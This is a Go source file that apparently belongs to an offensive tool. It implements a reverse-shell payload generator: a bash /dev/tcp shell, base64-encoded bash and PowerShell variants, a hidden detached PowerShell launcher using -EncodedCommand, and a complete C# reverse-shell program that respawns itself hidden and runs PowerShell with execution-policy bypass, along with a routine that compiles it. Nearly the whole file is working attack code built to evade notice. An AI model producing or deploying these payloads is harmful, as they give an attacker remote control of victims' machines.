package internal

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// ReverseShellGenerator generates reverse shell payloads
type ReverseShellGenerator struct {
	IP   string
	Port int
}

// NewReverseShellGenerator creates a new reverse shell generator
func NewReverseShellGenerator(ip string, port int) *ReverseShellGenerator {
	return &ReverseShellGenerator{
		IP:   ip,
		Port: port,
	}
}

// GenerateBash generates a bash reverse shell payload
func (r *ReverseShellGenerator) GenerateBash() string {
	return fmt.Sprintf("bash -c 'exec bash >& /dev/tcp/%s/%d 0>&1 &'", r.IP, r.Port)
}

// GenerateBashBase64 generates a base64-encoded bash reverse shell payload
func (r *ReverseShellGenerator) GenerateBashBase64() string {
	payload := r.GenerateBash()
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))
	return fmt.Sprintf("echo %s | base64 -d | bash", encoded)
}

// GeneratePowerShell generates a PowerShell reverse shell payload (base64 encoded)
func (r *ReverseShellGenerator) GeneratePowerShell() string {
	// PowerShell reverse shell script
	psScript := fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, r.IP, r.Port)

	// Encode to UTF-16LE (PowerShell's expected encoding for -EncodedCommand)
	utf16 := encodeUTF16LE(psScript)
	encoded := base64.StdEncoding.EncodeToString(utf16)

	return fmt.Sprintf("cmd /c powershell -e %s", encoded)
}

// GeneratePowerShellDetached generates a PowerShell reverse shell payload launched in a detached process.
func (r *ReverseShellGenerator) GeneratePowerShellDetached() string {
	psScript := fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, r.IP, r.Port)
	utf16 := encodeUTF16LE(psScript)
	encoded := base64.StdEncoding.EncodeToString(utf16)
	return fmt.Sprintf(`Start-Process powershell -WindowStyle Hidden -ArgumentList @('-NoProfile','-EncodedCommand','%s') | Out-Null`, encoded)
}

// GenerateCSharpSource generates a C# reverse shell source file using PowerShell with detached child launch.
func (r *ReverseShellGenerator) GenerateCSharpSource() string {
	return fmt.Sprintf(`using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;

public class Program
{
    private static StreamWriter streamWriter;

    private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
    {
        try
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
        catch { }
    }

    private static Process StartPowerShell()
    {
        var proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
        proc.StartInfo.Arguments = "-ep bypass -nologo";
        proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardError = true;
        proc.StartInfo.RedirectStandardInput = true;
        proc.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
        proc.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);
        proc.Start();
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();
        return proc;
    }

    public static void Main(string[] args)
    {
        try
        {
            if (args.Length == 0 || args[0] != "--child")
            {
                var self = Process.GetCurrentProcess().MainModule.FileName;
                var psi = new ProcessStartInfo();
                psi.FileName = self;
                psi.Arguments = "--child";
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.UseShellExecute = true;
                Process.Start(psi);
                return;
            }

            using (var client = new TcpClient("%s", %d))
            using (var stream = client.GetStream())
            using (var reader = new StreamReader(stream))
            {
                streamWriter = new StreamWriter(stream);
                streamWriter.AutoFlush = true;
                Process proc = StartPowerShell();

                string userInput = "";
                while ((userInput = reader.ReadLine()) != null)
                {
                    proc.StandardInput.WriteLine(userInput);
                    proc.StandardInput.Flush();
                    if (userInput.Equals("exit", StringComparison.OrdinalIgnoreCase))
                        break;
                }

                try { if (!proc.HasExited) proc.Kill(); } catch { }
                try { proc.WaitForExit(); } catch { }
                proc.Dispose();
            }
        }
        catch { }
    }
}
`, r.IP, r.Port)
}

func compileCSharpSource(source, outputPath string) error {
	tmpDir, err := os.MkdirTemp("", "flame-csharp-")
	if err != nil {
		return err
	}
	defer os.RemoveAll(tmpDir)

	srcPath := filepath.Join(tmpDir, "payload.cs")
	if err := os.WriteFile(srcPath, []byte(source), 0644); err != nil {
		return err
	}
	cmd := exec.Command("mcs", "-out:"+outputPath, srcPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("mcs failed: %v: %s", err, strings.TrimSpace(string(output)))
	}
	return nil
}

// encodeUTF16LE encodes a string to UTF-16 Little Endian
func encodeUTF16LE(s string) []byte {
	runes := []rune(s)
	result := make([]byte, len(runes)*2)
	for i, r := range runes {
		result[i*2] = byte(r)
		result[i*2+1] = byte(r >> 8)
	}
	return result
}

// GenerateAll returns all available payloads
func (r *ReverseShellGenerator) GenerateAll() []string {
	return []string{
		r.GenerateBash(),
		r.GenerateBashBase64(),
		r.GeneratePowerShell(),
		r.GenerateCSharpSource(),
	}
}

// GetPayloadNames returns the names of all payloads
func (r *ReverseShellGenerator) GetPayloadNames() []string {
	return []string{
		"Bash",
		"Bash (Base64)",
		"PowerShell",
		"CSharp",
	}
}

// FormatPayloads formats all payloads with their names for display
func (r *ReverseShellGenerator) FormatPayloads() string {
	var sb strings.Builder

	payloads := r.GenerateAll()
	names := r.GetPayloadNames()

	for i, payload := range payloads {
		if i > 0 {
			sb.WriteString("\n\n")
		}
		sb.WriteString(fmt.Sprintf("%s:\n%s", names[i], payload))
	}

	return sb.String()
}
